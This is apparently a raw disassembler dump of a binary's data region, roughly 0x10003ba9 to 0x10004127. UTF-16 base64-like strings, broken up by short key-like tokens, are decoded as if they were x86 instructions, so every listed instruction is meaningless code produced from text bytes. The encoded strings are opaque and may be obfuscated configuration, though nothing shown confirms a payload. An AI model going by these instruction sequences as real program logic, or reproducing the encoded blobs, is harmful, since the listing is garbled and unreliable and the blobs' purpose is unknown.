10003ba9:	74 00                	je     0x10003bab
10003bab:	4f                   	dec    %edi
10003bac:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003bb0:	00 31                	add    %dh,(%ecx)
10003bb2:	00 62 00             	add    %ah,0x0(%edx)
10003bb5:	48                   	dec    %eax
10003bb6:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003bba:	00 62 00             	add    %ah,0x0(%edx)
10003bbd:	56                   	push   %esi
10003bbe:	00 4a 00             	add    %cl,0x0(%edx)
10003bc1:	61                   	popa
10003bc2:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
10003bc6:	00 6b 00             	add    %ch,0x0(%ebx)
10003bc9:	33 00                	xor    (%eax),%eax
10003bcb:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003bcf:	78 00                	js     0x10003bd1
10003bd1:	33 00                	xor    (%eax),%eax
10003bd3:	57                   	push   %edi
10003bd4:	00 6d 00             	add    %ch,0x0(%ebp)
10003bd7:	31 00                	xor    %eax,(%eax)
10003bd9:	53                   	push   %ebx
10003bda:	00 57 00             	add    %dl,0x0(%edi)
10003bdd:	6b 00 39             	imul   $0x39,(%eax),%eax
10003be0:	00 57 00             	add    %dl,0x0(%edi)
10003be3:	4d                   	dec    %ebp
10003be4:	00 46 00             	add    %al,0x0(%esi)
10003be7:	67 00 35             	add    %dh,(%di)
10003bea:	00 4e 00             	add    %cl,0x0(%esi)
10003bed:	33 00                	xor    (%eax),%eax
10003bef:	56                   	push   %esi
10003bf0:	00 73 00             	add    %dh,0x0(%ebx)
10003bf3:	64 00 31             	add    %dh,%fs:(%ecx)
10003bf6:	00 70 00             	add    %dh,0x0(%eax)
10003bf9:	74 00                	je     0x10003bfb
10003bfb:	55                   	push   %ebp
10003bfc:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003c00:	00 50 00             	add    %dl,0x0(%eax)
10003c03:	4f                   	dec    %edi
10003c04:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003c08:	00 31                	add    %dh,(%ecx)
10003c0a:	00 62 00             	add    %ah,0x0(%edx)
10003c0d:	48                   	dec    %eax
10003c0e:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003c12:	00 62 00             	add    %ah,0x0(%edx)
10003c15:	56                   	push   %esi
10003c16:	00 4a 00             	add    %cl,0x0(%edx)
10003c19:	61                   	popa
10003c1a:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
10003c1e:	00 4e 00             	add    %cl,0x0(%esi)
10003c21:	4b                   	dec    %ebx
10003c22:	00 62 00             	add    %ah,0x0(%edx)
10003c25:	44                   	inc    %esp
10003c26:	00 6b 00             	add    %ch,0x0(%ebx)
10003c29:	33 00                	xor    (%eax),%eax
10003c2b:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003c2f:	78 00                	js     0x10003c31
10003c31:	33 00                	xor    (%eax),%eax
10003c33:	57                   	push   %edi
10003c34:	00 6d 00             	add    %ch,0x0(%ebp)
10003c37:	31 00                	xor    %eax,(%eax)
10003c39:	53                   	push   %ebx
10003c3a:	00 57 00             	add    %dl,0x0(%edi)
10003c3d:	6b 00 38             	imul   $0x38,(%eax),%eax
10003c40:	00 35 00 4e 00 33    	add    %dh,0x33004e00
10003c46:	00 56 00             	add    %dl,0x0(%esi)
10003c49:	73 00                	jae    0x10003c4b
10003c4b:	64 00 31             	add    %dh,%fs:(%ecx)
10003c4e:	00 70 00             	add    %dh,0x0(%eax)
10003c51:	74 00                	je     0x10003c53
10003c53:	55                   	push   %ebp
10003c54:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003c58:	00 50 00             	add    %dl,0x0(%eax)
10003c5b:	57                   	push   %edi
10003c5c:	00 6a 00             	add    %ch,0x0(%edx)
10003c5f:	4e                   	dec    %esi
10003c60:	00 4f 00             	add    %cl,0x0(%edi)
10003c63:	4f                   	dec    %edi
10003c64:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003c68:	00 31                	add    %dh,(%ecx)
10003c6a:	00 62 00             	add    %ah,0x0(%edx)
10003c6d:	48                   	dec    %eax
10003c6e:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003c72:	00 62 00             	add    %ah,0x0(%edx)
10003c75:	56                   	push   %esi
10003c76:	00 4a 00             	add    %cl,0x0(%edx)
10003c79:	61                   	popa
10003c7a:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
10003c7e:	00 6b 00             	add    %ch,0x0(%ebx)
10003c81:	33 00                	xor    (%eax),%eax
10003c83:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003c87:	78 00                	js     0x10003c89
10003c89:	33 00                	xor    (%eax),%eax
10003c8b:	57                   	push   %edi
10003c8c:	00 6d 00             	add    %ch,0x0(%ebp)
10003c8f:	31 00                	xor    %eax,(%eax)
10003c91:	53                   	push   %ebx
10003c92:	00 57 00             	add    %dl,0x0(%edi)
10003c95:	6b 00 39             	imul   $0x39,(%eax),%eax
10003c98:	00 34 00             	add    %dh,(%eax,%eax,1)
10003c9b:	59                   	pop    %ecx
10003c9c:	00 6b 00             	add    %ch,0x0(%ebx)
10003c9f:	45                   	inc    %ebp
10003ca0:	00 35 00 4e 00 33    	add    %dh,0x33004e00
10003ca6:	00 56 00             	add    %dl,0x0(%esi)
10003ca9:	73 00                	jae    0x10003cab
10003cab:	64 00 31             	add    %dh,%fs:(%ecx)
10003cae:	00 70 00             	add    %dh,0x0(%eax)
10003cb1:	74 00                	je     0x10003cb3
10003cb3:	55                   	push   %ebp
10003cb4:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003cb8:	00 50 00             	add    %dl,0x0(%eax)
10003cbb:	4f                   	dec    %edi
10003cbc:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
10003cc0:	00 31                	add    %dh,(%ecx)
10003cc2:	00 62 00             	add    %ah,0x0(%edx)
10003cc5:	48                   	dec    %eax
10003cc6:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003cca:	00 62 00             	add    %ah,0x0(%edx)
10003ccd:	56                   	push   %esi
10003cce:	00 4a 00             	add    %cl,0x0(%edx)
10003cd1:	61                   	popa
10003cd2:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
10003cd6:	00 30                	add    %dh,(%eax)
10003cd8:	00 39                	add    %bh,(%ecx)
10003cda:	00 4f 00             	add    %cl,0x0(%edi)
10003cdd:	54                   	push   %esp
10003cde:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
10003ce2:	00 62 00             	add    %ah,0x0(%edx)
10003ce5:	48                   	dec    %eax
10003ce6:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003cea:	00 62 00             	add    %ah,0x0(%edx)
10003ced:	56                   	push   %esi
10003cee:	00 4a 00             	add    %cl,0x0(%edx)
10003cf1:	61                   	popa
10003cf2:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
10003cf6:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10003cfc:	15 39 00 37 00       	adc    $0x370039,%eax
10003d01:	75 00                	jne    0x10003d03
10003d03:	6c                   	insb   (%dx),%es:(%edi)
10003d04:	00 77 00             	add    %dh,0x0(%edi)
10003d07:	5a                   	pop    %edx
10003d08:	00 6d 00             	add    %ch,0x0(%ebp)
10003d0b:	52                   	push   %edx
10003d0c:	00 5a 00             	add    %bl,0x0(%edx)
10003d0f:	4f                   	dec    %edi
10003d10:	00 00                	add    %al,(%eax)
10003d12:	81 b1 63 00 7a 00 4a 	xorl   $0x72004a,0x7a0063(%ecx)
10003d19:	00 72 00 
10003d1c:	4e                   	dec    %esi
10003d1d:	00 45 00             	add    %al,0x0(%ebp)
10003d20:	46                   	inc    %esi
10003d21:	00 71 00             	add    %dh,0x0(%ecx)
10003d24:	56                   	push   %esi
10003d25:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003d29:	00 76 00             	add    %dh,0x0(%esi)
10003d2c:	63 00                	arpl   %eax,(%eax)
10003d2e:	6c                   	insb   (%dx),%es:(%edi)
10003d2f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003d33:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003d37:	00 4d 00             	add    %cl,0x0(%ebp)
10003d3a:	79 00                	jns    0x10003d3c
10003d3c:	61                   	popa
10003d3d:	00 7a 00             	add    %bh,0x0(%edx)
10003d40:	52                   	push   %edx
10003d41:	00 42 00             	add    %al,0x0(%edx)
10003d44:	61                   	popa
10003d45:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10003d49:	00 31                	add    %dh,(%ecx)
10003d4b:	00 62 00             	add    %ah,0x0(%edx)
10003d4e:	33 00                	xor    (%eax),%eax
10003d50:	4a                   	dec    %edx
10003d51:	00 7a 00             	add    %bh,0x0(%edx)
10003d54:	4d                   	dec    %ebp
10003d55:	00 6d 00             	add    %ch,0x0(%ebp)
10003d58:	73 00                	jae    0x10003d5a
10003d5a:	30 00                	xor    %al,(%eax)
10003d5c:	51                   	push   %ecx
10003d5d:	00 57 00             	add    %dl,0x0(%edi)
10003d60:	70 00                	jo     0x10003d62
10003d62:	55                   	push   %ebp
10003d63:	00 4e 00             	add    %cl,0x0(%esi)
10003d66:	57                   	push   %edi
10003d67:	00 39                	add    %bh,(%ecx)
10003d69:	00 79 00             	add    %bh,0x0(%ecx)
10003d6c:	64 00 32             	add    %dh,%fs:(%edx)
10003d6f:	00 4a 00             	add    %cl,0x0(%edx)
10003d72:	74 00                	je     0x10003d74
10003d74:	63 00                	arpl   %eax,(%eax)
10003d76:	7a 00                	jp     0x10003d78
10003d78:	4a                   	dec    %edx
10003d79:	00 72 00             	add    %dh,0x0(%edx)
10003d7c:	4e                   	dec    %esi
10003d7d:	00 45 00             	add    %al,0x0(%ebp)
10003d80:	46                   	inc    %esi
10003d81:	00 71 00             	add    %dh,0x0(%ecx)
10003d84:	56                   	push   %esi
10003d85:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003d89:	00 76 00             	add    %dh,0x0(%esi)
10003d8c:	63 00                	arpl   %eax,(%eax)
10003d8e:	6e                   	outsb  %ds:(%esi),(%dx)
10003d8f:	00 4d 00             	add    %cl,0x0(%ebp)
10003d92:	79 00                	jns    0x10003d94
10003d94:	61                   	popa
10003d95:	00 7a 00             	add    %bh,0x0(%edx)
10003d98:	52                   	push   %edx
10003d99:	00 42 00             	add    %al,0x0(%edx)
10003d9c:	61                   	popa
10003d9d:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10003da1:	00 31                	add    %dh,(%ecx)
10003da3:	00 62 00             	add    %ah,0x0(%edx)
10003da6:	33 00                	xor    (%eax),%eax
10003da8:	4a                   	dec    %edx
10003da9:	00 57 00             	add    %dl,0x0(%edi)
10003dac:	4d                   	dec    %ebp
10003dad:	00 46 00             	add    %al,0x0(%esi)
10003db0:	68 00 7a 00 4d       	push   $0x4d007a00
10003db5:	00 6d 00             	add    %ch,0x0(%ebp)
10003db8:	73 00                	jae    0x10003dba
10003dba:	30 00                	xor    %al,(%eax)
10003dbc:	51                   	push   %ecx
10003dbd:	00 57 00             	add    %dl,0x0(%edi)
10003dc0:	70 00                	jo     0x10003dc2
10003dc2:	55                   	push   %ebp
10003dc3:	00 4e 00             	add    %cl,0x0(%esi)
10003dc6:	57                   	push   %edi
10003dc7:	00 39                	add    %bh,(%ecx)
10003dc9:	00 79 00             	add    %bh,0x0(%ecx)
10003dcc:	63 00                	arpl   %eax,(%eax)
10003dce:	7a 00                	jp     0x10003dd0
10003dd0:	4a                   	dec    %edx
10003dd1:	00 72 00             	add    %dh,0x0(%edx)
10003dd4:	4e                   	dec    %esi
10003dd5:	00 45 00             	add    %al,0x0(%ebp)
10003dd8:	46                   	inc    %esi
10003dd9:	00 71 00             	add    %dh,0x0(%ecx)
10003ddc:	56                   	push   %esi
10003ddd:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003de1:	00 76 00             	add    %dh,0x0(%esi)
10003de4:	63 00                	arpl   %eax,(%eax)
10003de6:	6a 00                	push   $0x0
10003de8:	4a                   	dec    %edx
10003de9:	00 4f 00             	add    %cl,0x0(%edi)
10003dec:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10003df0:	4d                   	dec    %ebp
10003df1:	00 79 00             	add    %bh,0x0(%ecx)
10003df4:	61                   	popa
10003df5:	00 7a 00             	add    %bh,0x0(%edx)
10003df8:	52                   	push   %edx
10003df9:	00 42 00             	add    %al,0x0(%edx)
10003dfc:	61                   	popa
10003dfd:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10003e01:	00 31                	add    %dh,(%ecx)
10003e03:	00 62 00             	add    %ah,0x0(%edx)
10003e06:	33 00                	xor    (%eax),%eax
10003e08:	4a                   	dec    %edx
10003e09:	00 7a 00             	add    %bh,0x0(%edx)
10003e0c:	4d                   	dec    %ebp
10003e0d:	00 6d 00             	add    %ch,0x0(%ebp)
10003e10:	73 00                	jae    0x10003e12
10003e12:	30 00                	xor    %al,(%eax)
10003e14:	51                   	push   %ecx
10003e15:	00 57 00             	add    %dl,0x0(%edi)
10003e18:	70 00                	jo     0x10003e1a
10003e1a:	55                   	push   %ebp
10003e1b:	00 4e 00             	add    %cl,0x0(%esi)
10003e1e:	57                   	push   %edi
10003e1f:	00 39                	add    %bh,(%ecx)
10003e21:	00 79 00             	add    %bh,0x0(%ecx)
10003e24:	59                   	pop    %ecx
10003e25:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003e29:	00 43 00             	add    %al,0x0(%ebx)
10003e2c:	63 00                	arpl   %eax,(%eax)
10003e2e:	7a 00                	jp     0x10003e30
10003e30:	4a                   	dec    %edx
10003e31:	00 72 00             	add    %dh,0x0(%edx)
10003e34:	4e                   	dec    %esi
10003e35:	00 45 00             	add    %al,0x0(%ebp)
10003e38:	46                   	inc    %esi
10003e39:	00 71 00             	add    %dh,0x0(%ecx)
10003e3c:	56                   	push   %esi
10003e3d:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003e41:	00 76 00             	add    %dh,0x0(%esi)
10003e44:	63 00                	arpl   %eax,(%eax)
10003e46:	6e                   	outsb  %ds:(%esi),(%dx)
10003e47:	00 4d 00             	add    %cl,0x0(%ebp)
10003e4a:	79 00                	jns    0x10003e4c
10003e4c:	61                   	popa
10003e4d:	00 7a 00             	add    %bh,0x0(%edx)
10003e50:	52                   	push   %edx
10003e51:	00 42 00             	add    %al,0x0(%edx)
10003e54:	61                   	popa
10003e55:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10003e59:	00 31                	add    %dh,(%ecx)
10003e5b:	00 62 00             	add    %ah,0x0(%edx)
10003e5e:	33 00                	xor    (%eax),%eax
10003e60:	4a                   	dec    %edx
10003e61:	00 77 00             	add    %dh,0x0(%edi)
10003e64:	59                   	pop    %ecx
10003e65:	00 6b 00             	add    %ch,0x0(%ebx)
10003e68:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
10003e6c:	4d                   	dec    %ebp
10003e6d:	00 6d 00             	add    %ch,0x0(%ebp)
10003e70:	73 00                	jae    0x10003e72
10003e72:	30 00                	xor    %al,(%eax)
10003e74:	51                   	push   %ecx
10003e75:	00 57 00             	add    %dl,0x0(%edi)
10003e78:	70 00                	jo     0x10003e7a
10003e7a:	55                   	push   %ebp
10003e7b:	00 4e 00             	add    %cl,0x0(%esi)
10003e7e:	57                   	push   %edi
10003e7f:	00 39                	add    %bh,(%ecx)
10003e81:	00 79 00             	add    %bh,0x0(%ecx)
10003e84:	63 00                	arpl   %eax,(%eax)
10003e86:	7a 00                	jp     0x10003e88
10003e88:	4a                   	dec    %edx
10003e89:	00 72 00             	add    %dh,0x0(%edx)
10003e8c:	4e                   	dec    %esi
10003e8d:	00 45 00             	add    %al,0x0(%ebp)
10003e90:	46                   	inc    %esi
10003e91:	00 71 00             	add    %dh,0x0(%ecx)
10003e94:	56                   	push   %esi
10003e95:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003e99:	00 76 00             	add    %dh,0x0(%esi)
10003e9c:	63 00                	arpl   %eax,(%eax)
10003e9e:	6c                   	insb   (%dx),%es:(%edi)
10003e9f:	00 5a 00             	add    %bl,0x0(%edx)
10003ea2:	35 00 63 00 7a       	xor    $0x7a006300,%eax
10003ea7:	00 4a 00             	add    %cl,0x0(%edx)
10003eaa:	72 00                	jb     0x10003eac
10003eac:	4e                   	dec    %esi
10003ead:	00 45 00             	add    %al,0x0(%ebp)
10003eb0:	46                   	inc    %esi
10003eb1:	00 71 00             	add    %dh,0x0(%ecx)
10003eb4:	56                   	push   %esi
10003eb5:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10003eb9:	00 76 00             	add    %dh,0x0(%esi)
10003ebc:	63 00                	arpl   %eax,(%eax)
10003ebe:	67 00 3d             	add    %bh,(%di)
10003ec1:	00 3d 00 00 15 73    	add    %bh,0x73150000
10003ec7:	00 32                	add    %dh,(%edx)
10003ec9:	00 6b 00             	add    %ch,0x0(%ebx)
10003ecc:	34 00                	xor    $0x0,%al
10003ece:	41                   	inc    %ecx
10003ecf:	00 6a 00             	add    %ch,0x0(%edx)
10003ed2:	54                   	push   %esp
10003ed3:	00 35 00 6f 00 72    	add    %dh,0x72006f00
10003ed9:	00 00                	add    %al,(%eax)
10003edb:	80 b9 4f 00 47 00 4a 	cmpb   $0x4a,0x47004f(%ecx)
10003ee2:	00 58 00             	add    %bl,0x0(%eax)
10003ee5:	53                   	push   %ebx
10003ee6:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003eea:	00 4a 00             	add    %cl,0x0(%edx)
10003eed:	55                   	push   %ebp
10003eee:	00 56 00             	add    %dl,0x0(%esi)
10003ef1:	45                   	inc    %ebp
10003ef2:	00 78 00             	add    %bh,0x0(%eax)
10003ef5:	56                   	push   %esi
10003ef6:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
10003efa:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
10003efe:	00 6a 00             	add    %ch,0x0(%edx)
10003f01:	68 00 69 00 56       	push   $0x56006900
10003f06:	00 30                	add    %dh,(%eax)
10003f08:	00 70 00             	add    %dh,0x0(%eax)
10003f0b:	5a                   	pop    %edx
10003f0c:	00 53 00             	add    %dl,0x0(%ebx)
10003f0f:	56                   	push   %esi
10003f10:	00 46 00             	add    %al,0x0(%esi)
10003f13:	52                   	push   %edx
10003f14:	00 4d 00             	add    %cl,0x0(%ebp)
10003f17:	56                   	push   %esi
10003f18:	00 59 00             	add    %bl,0x0(%ecx)
10003f1b:	34 00                	xor    $0x0,%al
10003f1d:	59                   	pop    %ecx
10003f1e:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003f22:	00 4b 00             	add    %cl,0x0(%ebx)
10003f25:	57                   	push   %edi
10003f26:	00 55 00             	add    %dl,0x0(%ebp)
10003f29:	6c                   	insb   (%dx),%es:(%edi)
10003f2a:	00 52 00             	add    %dl,0x0(%edx)
10003f2d:	55                   	push   %ebp
10003f2e:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10003f32:	00 57 00             	add    %dl,0x0(%edi)
10003f35:	62 00                	bound  %eax,(%eax)
10003f37:	6c                   	insb   (%dx),%es:(%edi)
10003f38:	00 46 00             	add    %al,0x0(%esi)
10003f3b:	59                   	pop    %ecx
10003f3c:	00 4f 00             	add    %cl,0x0(%edi)
10003f3f:	47                   	inc    %edi
10003f40:	00 4a 00             	add    %cl,0x0(%edx)
10003f43:	58                   	pop    %eax
10003f44:	00 53 00             	add    %dl,0x0(%ebx)
10003f47:	6c                   	insb   (%dx),%es:(%edi)
10003f48:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10003f4c:	00 55 00             	add    %dl,0x0(%ebp)
10003f4f:	56                   	push   %esi
10003f50:	00 45 00             	add    %al,0x0(%ebp)
10003f53:	78 00                	js     0x10003f55
10003f55:	56                   	push   %esi
10003f56:	00 6a 00             	add    %ch,0x0(%edx)
10003f59:	68 00 69 00 56       	push   $0x56006900
10003f5e:	00 30                	add    %dh,(%eax)
10003f60:	00 70 00             	add    %dh,0x0(%eax)
10003f63:	5a                   	pop    %edx
10003f64:	00 53 00             	add    %dl,0x0(%ebx)
10003f67:	56                   	push   %esi
10003f68:	00 46 00             	add    %al,0x0(%esi)
10003f6b:	52                   	push   %edx
10003f6c:	00 4d 00             	add    %cl,0x0(%ebp)
10003f6f:	56                   	push   %esi
10003f70:	00 5a 00             	add    %bl,0x0(%edx)
10003f73:	4f                   	dec    %edi
10003f74:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
10003f78:	00 68 00             	add    %ch,0x0(%eax)
10003f7b:	69 00 56 00 30 00    	imul   $0x300056,(%eax),%eax
10003f81:	70 00                	jo     0x10003f83
10003f83:	5a                   	pop    %edx
10003f84:	00 53 00             	add    %dl,0x0(%ebx)
10003f87:	56                   	push   %esi
10003f88:	00 46 00             	add    %al,0x0(%esi)
10003f8b:	52                   	push   %edx
10003f8c:	00 4d 00             	add    %cl,0x0(%ebp)
10003f8f:	56                   	push   %esi
10003f90:	00 59 00             	add    %bl,0x0(%ecx)
10003f93:	3d 00 00 15 38       	cmp    $0x38150000,%eax
10003f98:	00 62 00             	add    %ah,0x0(%edx)
10003f9b:	57                   	push   %edi
10003f9c:	00 4a 00             	add    %cl,0x0(%edx)
10003f9f:	59                   	pop    %ecx
10003fa0:	00 49 00             	add    %cl,0x0(%ecx)
10003fa3:	51                   	push   %ecx
10003fa4:	00 51 00             	add    %dl,0x0(%ecx)
10003fa7:	31 00                	xor    %eax,(%eax)
10003fa9:	56                   	push   %esi
10003faa:	00 00                	add    %al,(%eax)
10003fac:	80 b9 61 00 58 00 64 	cmpb   $0x64,0x580061(%ecx)
10003fb3:	00 78 00             	add    %bh,0x0(%eax)
10003fb6:	5a                   	pop    %edx
10003fb7:	00 6a 00             	add    %ch,0x0(%edx)
10003fba:	49                   	dec    %ecx
10003fbb:	00 30                	add    %dh,(%eax)
10003fbd:	00 56 00             	add    %dl,0x0(%esi)
10003fc0:	55                   	push   %ebp
10003fc1:	00 4e 00             	add    %cl,0x0(%esi)
10003fc4:	77 00                	ja     0x10003fc6
10003fc6:	51                   	push   %ecx
10003fc7:	00 6d 00             	add    %ch,0x0(%ebp)
10003fca:	46                   	inc    %esi
10003fcb:	00 58 00             	add    %bl,0x0(%eax)
10003fce:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10003fd2:	6c                   	insb   (%dx),%es:(%edi)
10003fd3:	00 33                	add    %dh,(%ebx)
10003fd5:	00 63 00             	add    %ah,0x0(%ebx)
10003fd8:	57                   	push   %edi
10003fd9:	00 59 00             	add    %bl,0x0(%ecx)
10003fdc:	79 00                	jns    0x10003fde
10003fde:	4e                   	dec    %esi
10003fdf:	00 46 00             	add    %al,0x0(%esi)
10003fe2:	56                   	push   %esi
10003fe3:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
10003fe7:	00 45 00             	add    %al,0x0(%ebp)
10003fea:	4a                   	dec    %edx
10003feb:	00 70 00             	add    %dh,0x0(%eax)
10003fee:	64 00 33             	add    %dh,%fs:(%ebx)
10003ff1:	00 46 00             	add    %al,0x0(%esi)
10003ff4:	6d                   	insl   (%dx),%es:(%edi)
10003ff5:	00 4d 00             	add    %cl,0x0(%ebp)
10003ff8:	6a 00                	push   $0x0
10003ffa:	52                   	push   %edx
10003ffb:	00 56 00             	add    %dl,0x0(%esi)
10003ffe:	51                   	push   %ecx
10003fff:	00 33                	add    %dh,(%ebx)
10004001:	00 42 00             	add    %al,0x0(%edx)
10004004:	43                   	inc    %ebx
10004005:	00 61 00             	add    %ah,0x0(%ecx)
10004008:	47                   	inc    %edi
10004009:	00 4d 00             	add    %cl,0x0(%ebp)
1000400c:	79 00                	jns    0x1000400e
1000400e:	61                   	popa
1000400f:	00 58 00             	add    %bl,0x0(%eax)
10004012:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
10004016:	5a                   	pop    %edx
10004017:	00 6a 00             	add    %ch,0x0(%edx)
1000401a:	49                   	dec    %ecx
1000401b:	00 30                	add    %dh,(%eax)
1000401d:	00 56 00             	add    %dl,0x0(%esi)
10004020:	55                   	push   %ebp
10004021:	00 4e 00             	add    %cl,0x0(%esi)
10004024:	77 00                	ja     0x10004026
10004026:	51                   	push   %ecx
10004027:	00 6d 00             	add    %ch,0x0(%ebp)
1000402a:	6c                   	insb   (%dx),%es:(%edi)
1000402b:	00 33                	add    %dh,(%ebx)
1000402d:	00 63 00             	add    %ah,0x0(%ebx)
10004030:	57                   	push   %edi
10004031:	00 59 00             	add    %bl,0x0(%ecx)
10004034:	79 00                	jns    0x10004036
10004036:	4e                   	dec    %esi
10004037:	00 46 00             	add    %al,0x0(%esi)
1000403a:	56                   	push   %esi
1000403b:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
1000403f:	00 45 00             	add    %al,0x0(%ebp)
10004042:	49                   	dec    %ecx
10004043:	00 77 00             	add    %dh,0x0(%edi)
10004046:	50                   	push   %eax
10004047:	00 57 00             	add    %dl,0x0(%edi)
1000404a:	6c                   	insb   (%dx),%es:(%edi)
1000404b:	00 33                	add    %dh,(%ebx)
1000404d:	00 63 00             	add    %ah,0x0(%ebx)
10004050:	57                   	push   %edi
10004051:	00 59 00             	add    %bl,0x0(%ecx)
10004054:	79 00                	jns    0x10004056
10004056:	4e                   	dec    %esi
10004057:	00 46 00             	add    %al,0x0(%esi)
1000405a:	56                   	push   %esi
1000405b:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
1000405f:	00 45 00             	add    %al,0x0(%ebp)
10004062:	49                   	dec    %ecx
10004063:	00 3d 00 00 15 69    	add    %bh,0x69150000
10004069:	00 77 00             	add    %dh,0x0(%edi)
1000406c:	71 00                	jno    0x1000406e
1000406e:	66 00 32             	data16 add %dh,(%edx)
10004071:	00 34 00             	add    %dh,(%eax,%eax,1)
10004074:	55                   	push   %ebp
10004075:	00 43 00             	add    %al,0x0(%ebx)
10004078:	70 00                	jo     0x1000407a
1000407a:	42                   	inc    %edx
1000407b:	00 00                	add    %al,(%eax)
1000407d:	80 f9 62             	cmp    $0x62,%cl
10004080:	00 33                	add    %dh,(%ebx)
10004082:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10004086:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
1000408a:	00 46 00             	add    %al,0x0(%esi)
1000408d:	53                   	push   %ebx
1000408e:	00 56 00             	add    %dl,0x0(%esi)
10004091:	6d                   	insl   (%dx),%es:(%edi)
10004092:	00 35 00 51 00 5a    	add    %dh,0x5a005100
10004098:	00 56 00             	add    %dl,0x0(%esi)
1000409b:	46                   	inc    %esi
1000409c:	00 59 00             	add    %bl,0x0(%ecx)
1000409f:	51                   	push   %ecx
100040a0:	00 6d 00             	add    %ch,0x0(%ebp)
100040a3:	39 00                	cmp    %eax,(%eax)
100040a5:	35 00 5a 00 55       	xor    $0x55005a00,%eax
100040aa:	00 77 00             	add    %dh,0x0(%edi)
100040ad:	78 00                	js     0x100040af
100040af:	55                   	push   %ebp
100040b0:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
100040b4:	00 75 00             	add    %dh,0x0(%ebp)
100040b7:	55                   	push   %ebp
100040b8:	00 47 00             	add    %al,0x0(%edi)
100040bb:	56                   	push   %esi
100040bc:	00 76 00             	add    %dh,0x0(%esi)
100040bf:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
100040c3:	56                   	push   %esi
100040c4:	00 4d 00             	add    %cl,0x0(%ebp)
100040c7:	4d                   	dec    %ebp
100040c8:	00 56 00             	add    %dl,0x0(%esi)
100040cb:	4a                   	dec    %edx
100040cc:	00 57 00             	add    %dl,0x0(%edi)
100040cf:	62 00                	bound  %eax,(%eax)
100040d1:	6c                   	insb   (%dx),%es:(%edi)
100040d2:	00 42 00             	add    %al,0x0(%edx)
100040d5:	6c                   	insb   (%dx),%es:(%edi)
100040d6:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
100040da:	00 52 00             	add    %dl,0x0(%edx)
100040dd:	48                   	dec    %eax
100040de:	00 62 00             	add    %ah,0x0(%edx)
100040e1:	33 00                	xor    (%eax),%eax
100040e3:	6c                   	insb   (%dx),%es:(%edi)
100040e4:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
100040e8:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
100040ec:	00 53 00             	add    %dl,0x0(%ebx)
100040ef:	56                   	push   %esi
100040f0:	00 6d 00             	add    %ch,0x0(%ebp)
100040f3:	35 00 51 00 5a       	xor    $0x5a005100,%eax
100040f8:	00 57 00             	add    %dl,0x0(%edi)
100040fb:	39 00                	cmp    %eax,(%eax)
100040fd:	35 00 5a 00 55       	xor    $0x55005a00,%eax
10004102:	00 77 00             	add    %dh,0x0(%edi)
10004105:	78 00                	js     0x10004107
10004107:	55                   	push   %ebp
10004108:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
1000410c:	00 75 00             	add    %dh,0x0(%ebp)
1000410f:	55                   	push   %ebp
10004110:	00 47 00             	add    %al,0x0(%edi)
10004113:	56                   	push   %esi
10004114:	00 47 00             	add    %al,0x0(%edi)
10004117:	4d                   	dec    %ebp
10004118:	00 57 00             	add    %dl,0x0(%edi)
1000411b:	4a                   	dec    %edx
1000411c:	00 76 00             	add    %dh,0x0(%esi)
1000411f:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
10004123:	56                   	push   %esi
10004124:	00 4d 00             	add    %cl,0x0(%ebp)
10004127:	4d                   	dec    %ebp
